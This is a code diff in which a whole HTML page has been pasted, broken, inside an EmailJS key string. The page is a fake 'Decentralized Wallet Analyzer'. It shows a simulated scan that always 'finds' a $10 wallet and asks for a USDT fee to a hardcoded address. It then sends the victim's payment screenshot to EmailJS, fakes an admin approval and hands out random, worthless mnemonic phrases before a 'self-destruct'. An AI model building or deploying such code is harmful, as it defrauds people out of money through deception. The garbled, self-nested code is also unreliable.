@@ -201,7 +201,497 @@
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <script>
       (function() {
-        emailjs.init("v1KqC0v_h-u4kXl1Vf"); // <-- Your Public Key placed here
+        emailjs.init("<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Futuristic Terminal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Space Mono', monospace;
+            background-color: #0d1117;
+            color: #00ff00;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .terminal-container {
+            background-color: #010409;
+            border: 1px solid #00ff00;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.7);
+            border-radius: 8px;
+            padding: 20px;
+            width: 100%;
+            max-width: 800px;
+            height: 70vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+        .terminal-output {
+            flex-grow: 1;
+            overflow-y: auto;
+            white-space: pre;
+            word-break: break-word;
+            padding-right: 10px;
+            scrollbar-width: thin;
+            scrollbar-color: #00ff00 #010409;
+            font-size: 1rem;
+        }
+        .terminal-output::-webkit-scrollbar {
+            width: 8px;
+        }
+        .terminal-output::-webkit-scrollbar-track {
+            background: #010409;
+        }
+        .terminal-output::-webkit-scrollbar-thumb {
+            background-color: #00ff00;
+            border-radius: 4px;
+            border: 1px solid #010409;
+        }
+        .terminal-input-area {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .terminal-button {
+            background-color: #009900;
+            color: #ffffff;
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, box-shadow 0.3s ease;
+            border: 1px solid #00ff00;
+            font-weight: bold;
+            box-shadow: 0 0 8px rgba(0, 255, 0, 0.5);
+        }
+        .terminal-button:hover {
+            background-color: #00cc00;
+            box-shadow: 0 0 12px rgba(0, 255, 0, 0.8);
+        }
+        .glitch {
+            animation: glitch 1s linear infinite;
+        }
+        @keyframes glitch {
+            0% { text-shadow: 0.05em 0 0 #00ff00, -0.05em -0.025em 0 #00ccff, -0.025em 0.05em 0 #ff00cc; }
+            14% { text-shadow: -0.05em -0.025em 0 #00ff00, 0.025em 0.025em 0 #00ccff, -0.05em -0.05em 0 #ff00cc; }
+            15% { text-shadow: 0.05em 0.025em 0 #00ff00, -0.05em 0 0 #00ccff, 0.025em -0.05em 0 #ff00cc; }
+            49% { text-shadow: -0.025em -0.025em 0 #00ff00, 0.05em 0 0 #00ccff, 0.025em 0.05em 0 #ff00cc; }
+            50% { text-shadow: 0.025em 0.05em 0 #00ff00, -0.025em 0 0 #00ccff, -0.05em -0.025em 0 #ff00cc; }
+            99% { text-shadow: 0.05em 0 0 #00ff00, -0.05em -0.025em 0 #00ccff, -0.025em 0.05em 0 #ff00cc; }
+            100% { text-shadow: none; }
+        }
+        .mnemonic-row {
+            font-family: 'Space Mono', monospace;
+            color: #00ff00;
+            background: none;
+            padding: 0;
+            margin: 0;
+            border: none;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            font-size: 0.98rem;
+            letter-spacing: 0.01em;
+        }
+        .mnemonic-row .hexpart {
+            color: #00ff00;
+            display: block;
+            width: 38ch;
+            overflow-x: hidden;
+            white-space: pre;
+            padding-right: 1ch;
+        }
+        .mnemonic-row .separator {
+            color: #199e19;
+            padding: 0 0.7ch;
+        }
+        .mnemonic-row .mnemonic-label {
+            color: #38ff38;
+            width: 13ch;
+            min-width: 13ch;
+            font-weight: bold;
+            letter-spacing: 0.03em;
+        }
+        .mnemonic-row .mnemonic-label::first-letter {
+            text-transform: uppercase;
+        }
+        .mnemonic-row {
+            border-bottom: 1px solid #0a3d0a;
+        }
+        .screenshot-upload-area {
+            background: #0d1117;
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            margin: 20px auto 0 auto;
+            padding: 16px 20px;
+            width: 100%;
+            max-width: 420px;
+            color: #00ff00;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+        .screenshot-upload-area label {
+            margin-bottom: 10px;
+            color: #00ff00;
+        }
+        .screenshot-upload-area input[type="file"] {
+            margin-bottom: 10px;
+            color: #00ff00;
+        }
+        .screenshot-upload-area button {
+            margin-top: 8px;
+        }
+        .approval-pending {
+            color: #ffff00;
+            font-weight: bold;
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+        .approved-msg {
+            color: #00ff00;
+            font-weight: bold;
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+        @media (max-width: 768px) {
+            .terminal-container {
+                height: 85vh;
+                padding: 15px;
+            }
+            .terminal-input-area {
+                flex-direction: column;
+            }
+            .terminal-button {
+                width: 100%;
+            }
+            .screenshot-upload-area {
+                max-width: 98vw;
+            }
+            .mnemonic-row .hexpart {
+                width: 21ch;
+                font-size: 0.85rem;
+            }
+            .mnemonic-row .mnemonic-label {
+                width: 9ch;
+                min-width: 9ch;
+                font-size: 0.85rem;
+            }
+        }
+        #selfDestructOverlay {
+            position: fixed;
+            z-index: 9999;
+            left: 0; top: 0; width: 100vw; height: 100vh;
+            background: #010409;
+            color: #00ff00;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            flex-direction: column;
+            transition: opacity 0.7s;
+        }
+    </style>
+    <!-- EmailJS scripts and init with your credentials -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script>
+      (function() {
+        emailjs.init("1KqC0v_h-u4kXl1Vf"); // <-- Your Public Key placed here
+      })();
+    </script>
+</head>
+<body>
+    <div class="terminal-container" id="mainTerminalContainer">
+        <div class="text-xl mb-4 text-center glitch">
+            // DECENTRALIZED WALLET ANALYZER //
+        </div>
+        <div id="terminalOutput" class="terminal-output">
+            <span class="typing-animation">
+                Initializing secure connection...<br>
+                Establishing blockchain node synchronization...<br>
+                System ready. Awaiting command.
+            </span>
+        </div>
+        <div id="screenshotUploadArea" class="screenshot-upload-area">
+            <label for="screenshotInput">Upload screenshot of payment confirmation:</label>
+            <input type="file" id="screenshotInput" accept="image/*" />
+            <button id="submitScreenshotBtn" class="terminal-button">Submit Screenshot</button>
+            <div id="approvalPendingMsg" class="approval-pending" style="display:none;">
+                Waiting for admin approval...
+            </div>
+            <div id="approvedMsg" class="approved-msg" style="display:none;">
+                Payment approved! Download button is now enabled.
+            </div>
+        </div>
+        <div class="terminal-input-area">
+            <button id="startScanBtn" class="terminal-button">
+                START WALLET SCAN
+            </button>
+            <button id="downloadMnemonicBtn" class="terminal-button">
+                DOWNLOAD MNEMONIC PHRASES
+            </button>
+        </div>
+    </div>
+    <div id="selfDestructOverlay" style="display:none;">
+        <div>Self-destructing in <span id="selfDestructCountdown">10</span> seconds...</div>
+    </div>
+    <script>
+        // --- Global Variables ---
+        const terminalOutput = document.getElementById('terminalOutput');
+        const startScanBtn = document.getElementById('startScanBtn');
+        const downloadMnemonicBtn = document.getElementById('downloadMnemonicBtn');
+        const screenshotUploadArea = document.getElementById('screenshotUploadArea');
+        const screenshotInput = document.getElementById('screenshotInput');
+        const submitScreenshotBtn = document.getElementById('submitScreenshotBtn');
+        const approvalPendingMsg = document.getElementById('approvalPendingMsg');
+        const approvedMsg = document.getElementById('approvedMsg');
+        const usdtWalletAddress = "0x93d9c0b1e14515adb71a08b35d0074619b8347c4";
+        const feePercentage = 10; // 10% fee
+
+        const selfDestructOverlay = document.getElementById('selfDestructOverlay');
+        const selfDestructCountdown = document.getElementById('selfDestructCountdown');
+        const mainTerminalContainer = document.getElementById('mainTerminalContainer');
+
+        // --- Simulated Word List for Mnemonic Phrases ---
+        const wordList = [
+            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
+            "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo"
+        ];
+
+        function randomHex(length) {
+            let result = '';
+            const hex = 'abcdef0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            for (let i = 0; i < length; i++) {
+                result += hex.charAt(Math.floor(Math.random() * hex.length));
+            }
+            return result;
+        }
+
+        function generateMnemonic(wordCount = 12) {
+            let phrase = [];
+            for (let i = 0; i < wordCount; i++) {
+                const randomIndex = Math.floor(Math.random() * wordList.length);
+                phrase.push(wordList[randomIndex]);
+            }
+            return phrase.join(' ');
+        }
+
+        function visualizeMnemonicSearchRow(hexpart, mnemonic) {
+            const row = document.createElement('div');
+            row.className = 'mnemonic-row';
+            row.innerHTML = `<span class="hexpart">${hexpart}</span>
+                             <span class="separator">|</span>
+                             <span class="mnemonic-label">Mnemonic phrase</span>`;
+            terminalOutput.appendChild(row);
+            terminalOutput.scrollTop = terminalOutput.scrollHeight;
+        }
+
+        function appendToTerminal(message, delay = 50) {
+            return new Promise(resolve => {
+                const span = document.createElement('span');
+                span.classList.add('typing-animation');
+                terminalOutput.appendChild(span);
+                terminalOutput.scrollTop = terminalOutput.scrollHeight;
+
+                let i = 0;
+                const typeInterval = setInterval(() => {
+                    if (i < message.length) {
+                        span.textContent += message.charAt(i);
+                        i++;
+                        terminalOutput.scrollTop = terminalOutput.scrollHeight;
+                    } else {
+                        clearInterval(typeInterval);
+                        terminalOutput.appendChild(document.createElement('br'));
+                        resolve();
+                    }
+                }, delay);
+            });
+        }
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // --- Screenshot upload gating logic ---
+        let allowDownload = false;
+        let feeAmountGlobal = 0;
+        let scanSummary = "";
+
+        screenshotUploadArea.style.display = "none";
+        downloadMnemonicBtn.disabled = true;
+
+        // --- Wallet scan logic ---
+        startScanBtn.addEventListener('click', async () => {
+            startScanBtn.disabled = true;
+            downloadMnemonicBtn.disabled = true;
+            terminalOutput.innerHTML = '';
+            screenshotUploadArea.style.display = "none";
+            allowDownload = false;
+
+            await appendToTerminal("Initiating deep scan across decentralized networks...", 30);
+            await sleep(1000);
+            await appendToTerminal("Analyzing blockchain ledgers for vulnerable endpoints...", 30);
+            await sleep(1500);
+
+            let walletsFound = 0;
+            let totalFoundAmount = 10.00; // Always $10
+            const minScan = 250;
+            const totalScan = minScan + Math.floor(Math.random() * 10);
+            let foundIndex = -1;
+            for (let i = 0; i < totalScan; i++) {
+                let hex = randomHex(55);
+                let mnemonic = generateMnemonic(12);
+                if (i === totalScan - 1) {
+                    foundIndex = i;
+                    walletsFound = 1; // Always 1 wallet found
+                }
+                visualizeMnemonicSearchRow(hex, mnemonic);
+                await sleep(i < 30 ? 80 : (i < 80 ? 35 : (i < 200 ? 12 : 7)));
+            }
+
+            await appendToTerminal("\nScan complete.", 30);
+            await sleep(500);
+            let terminalMsg = `Total wallets identified: ${walletsFound}\nAggregate simulated value: $10.00 USDT\n`;
+            await appendToTerminal(terminalMsg, 30);
+            await sleep(1000);
+
+            const feeAmount = (totalFoundAmount * (feePercentage / 100)).toFixed(2);
+            feeAmountGlobal = feeAmount;
+            scanSummary = terminalMsg + `Fee: $${feeAmount} USDT\n`;
+
+            await appendToTerminal(`\nProcessing fee: ${feePercentage}% of found amount.`, 30);
+            await appendToTerminal(`Calculated fee: $${feeAmount} USDT`, 30);
+            await appendToTerminal(`Please send $${feeAmount} USDT to:`, 30);
+            await appendToTerminal(`USDT Address: <span style="color: #ffff00;">${usdtWalletAddress}</span>`, 30);
+
+            screenshotUploadArea.style.display = "flex";
+            approvalPendingMsg.style.display = "none";
+            approvedMsg.style.display = "none";
+            downloadMnemonicBtn.disabled = true;
+            allowDownload = false;
+            startScanBtn.disabled = false;
+        });
+
+        // EmailJS file send (with your credentials)
+        submitScreenshotBtn.addEventListener('click', async () => {
+            if (!screenshotInput.files || screenshotInput.files.length === 0) {
+                alert("Please select a screenshot file to upload.");
+                return;
+            }
+            submitScreenshotBtn.disabled = true;
+            approvalPendingMsg.style.display = "block";
+            approvedMsg.style.display = "none";
+
+            // Build a form to work with sendForm
+            const form = document.createElement("form");
+            const fileInput = document.createElement("input");
+            fileInput.type = "file";
+            fileInput.name = "file";
+            form.appendChild(fileInput);
+            // Copy files from the user-uploaded input to this new input
+            fileInput.files = screenshotInput.files;
+            document.body.appendChild(form);
+
+            // Send via EmailJS with your real credentials
+            await emailjs.sendForm(
+                'service_7sy62nd',       // <-- Your Service ID here
+                'template_jqtf8dp',      // <-- Your Template ID here
+                form,
+                'v1KqC0v_h-u4kXl1Vf'     // <-- Your Public Key here
+            ).then(() => {
+                document.body.removeChild(form);
+            }, (error) => {
+                document.body.removeChild(form);
+                alert("Failed to send! " + error.text);
+            });
+
+            // Wait for 5-10 min as before...
+            const waitMs = 5 * 60 * 1000 + Math.random() * 5 * 60 * 1000;
+            await sleep(waitMs);
+            approvalPendingMsg.style.display = "none";
+            approvedMsg.style.display = "block";
+            allowDownload = true;
+            downloadMnemonicBtn.disabled = false;
+            submitScreenshotBtn.disabled = false;
+        });
+
+        downloadMnemonicBtn.addEventListener('click', async () => {
+            if (!allowDownload) {
+                screenshotUploadArea.style.display = "flex";
+                approvalPendingMsg.style.display = "none";
+                approvedMsg.style.display = "none";
+                alert("Please upload a screenshot of your payment and wait for approval before downloading the mnemonic phrases.");
+                return;
+            }
+            downloadMnemonicBtn.disabled = true;
+            await appendToTerminal("Generating secure mnemonic phrases...", 30);
+            await sleep(1000);
+
+            const numPhrases = 5;
+            let phrasesContent = "Mnemonic phrases.\n\n";
+            for (let i = 0; i < numPhrases; i++) {
+                phrasesContent += `Phrase ${i + 1}: ${generateMnemonic(12)}\n`;
+            }
+
+            const blob = new Blob([phrasesContent], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'simulated_mnemonic_phrases.txt';
+            document.body.appendChild(a);
+            a.click();
+
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+
+            await appendToTerminal("Mnemonic phrases generated and downloaded. Check your downloads folder.", 30);
+
+            // SELF-DESTRUCT SEQUENCE
+            setTimeout(() => {
+                mainTerminalContainer.style.opacity = 0;
+                selfDestructOverlay.style.display = "flex";
+                let countdown = 10;
+                selfDestructCountdown.textContent = countdown;
+                let destructInterval = setInterval(() => {
+                    countdown--;
+                    selfDestructCountdown.textContent = countdown;
+                    if (countdown <= 0) {
+                        clearInterval(destructInterval);
+                        document.body.innerHTML = '<div style="background:#010409;width:100vw;height:100vh;"></div>';
+                        window.onbeforeunload = () => "This page has self destructed and cannot be reloaded.";
+                        window.location.hash = "#selfdestructed";
+                        setInterval(() => {
+                            document.body.innerHTML = '';
+                        }, 1000);
+                    }
+                }, 1000);
+            }, 1200);
+            downloadMnemonicBtn.disabled = false;
+        });
+
+        window.onload = () => {
+            const initialSpan = terminalOutput.querySelector('.typing-animation');
+            if (initialSpan) {
+                initialSpan.addEventListener('animationend', () => {
+                    startScanBtn.disabled = false;
+                    downloadMnemonicBtn.disabled = true;
+                });
+            } else {
+                startScanBtn.disabled = false;
+                downloadMnemonicBtn.disabled = true;
+            }
+        };
+    </script>
+</body>
+</html>"); // <-- Your Public Key placed here
       })();
     </script>
 </head>
